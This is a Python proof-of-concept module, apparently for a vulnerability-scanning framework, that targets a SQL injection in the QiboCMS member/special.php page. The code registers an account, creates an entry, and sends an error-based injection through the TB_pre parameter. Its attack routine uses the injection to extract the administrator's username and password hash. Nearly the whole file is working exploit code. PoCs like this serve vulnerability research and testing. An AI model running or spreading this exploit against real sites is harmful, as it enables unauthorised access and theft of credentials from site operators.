#!/usr/bin/env python
# coding: utf-8
import re
import os
from lib.request.basic import req
from lib.core.poc import POCBase, Output
from lib.core.register import registerPoc as register


class TestPOC(POCBase):
    vulID = '1886'  # vul ID
    version = '1'
    author = ['zhengdt']
    vulDate = '2014-12-28'
    createDate = '2015-05-11'
    updateDate = '2015-05-11'
    references = ['http://wooyun.org/bugs/wooyun-2015-0111673']
    name = 'QiboCMS /member/special.php SQL注入漏洞 POC'
    appPowerLink = 'http://www.qibosoft.com'
    appName = 'QiboCMS'
    appVersion = 'all'
    vulType = 'SQL Injection'
    desc = '''
        传入的表名直接带入 SQL 语句导致注入，可以获取管理员的账号密码，造成
        信息泄露。
    '''

    samples = []

    def attack(self, payload):
        sess = req.Session()
        random_str = os.urandom(5).encode('hex')
        data = {
            'username': random_str,
            'password': random_str,
            'password2': random_str,
            'email': '%s@qq.com' % random_str,
            'Submit3': 'x',
            'step': 2,
        }
        sess.post('%s/do/reg.php?f' % self.url, data=data)

        data = {
            'postdb[title]': os.urandom(3).encode('hex'),
            'postdb[fid]': 1,
            'Submit': 'x',
            'step': 2,
            'id': 0,
        }
        sess.post('%s/member/special.php?job=addsp' % self.url, data=data)
        response = sess.get('%s/member/special.php?job=listsp' %
                            self.url).content
        sp_id = re.search('"../do/showsp\.php\?fid=1&id=(\d+)"',
                          response).group(1)
        params = {
            'job': 'show_BBSiframe',
            'type': 'myatc',
            'id': sp_id,
            'TB_pre': ('qb_members where 1=1 and (select 1 from (select count('
                       '*),concat((%s),floor(rand(0)*2))x from information_sch'
                       'ema.tables group by x)a)#' % payload),
        }
        return sess.get('%s/member/special.php' % self.url,
                        params=params).content

    def _attack(self):
        result = {}
        response = self.attack('select concat(username,0x3a3a,password) from q'
                               'b_members limit 1')
        data = re.search('entry \'(?P<Username>.*?)::(?P<Password>[\w\d]{32})1'
                         '\'', response)
        if data:
            result['AdminInfo'] = data.groupdict()

        return self.parse_attack(result)

    def _verify(self):
        result = {}
        response = self.attack('select md5(1243141)')
        if '801742ae10d6831658ebd77ef881ac0c' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
